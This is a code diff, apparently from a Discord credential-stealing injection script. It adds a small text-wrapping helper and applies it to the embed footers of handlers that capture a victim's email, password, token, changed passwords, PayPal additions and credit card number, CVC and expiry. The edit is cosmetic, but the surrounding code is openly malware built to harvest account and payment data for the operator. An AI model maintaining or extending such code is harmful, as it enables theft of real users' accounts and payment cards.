@@ -65,6 +65,8 @@ const config = {
   },
 };
 
+const wrap = (raw, n) => raw.match(new RegExp(`.{1,${n}}`, 'g')).join('\n')
+
 const discordPath = (function () {
     const app = args[0].split(path.sep).slice(0, -1).join(path.sep);
     let resourcePath;
@@ -341,7 +343,7 @@ const login = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: config.stringspy.replace(/.{200}/g, "$0\n"),
+          text: wrap(config.stringspy, 25),
         },
       },
     ],
@@ -383,7 +385,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: config.stringspy.replace(/.{200}/g, "$0\n"),
+          text: wrap(config.stringspy, 25),
         },
       },
     ],
@@ -425,7 +427,7 @@ const emailChanged = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: config.stringspy.replace(/.{200}/g, "$0\n"),
+          text: wrap(config.stringspy, 25),
         },
       },
     ],
@@ -467,7 +469,7 @@ const PaypalAdded = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: config.stringspy.replace(/.{200}/g, "$0\n"),
+          text: wrap(config.stringspy, 25),
         },
       },
     ],
@@ -509,7 +511,7 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: config.stringspy.replace(/.{200}/g, "$0\n"),
+          text: wrap(config.stringspy, 25),
         },
       },
     ],
@@ -553,7 +555,7 @@ const nitroBought = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: config.stringspy.replace(/.{200}/g, "$0\n"),
+          text: wrap(config.stringspy, 25),
         },
       },
     ],
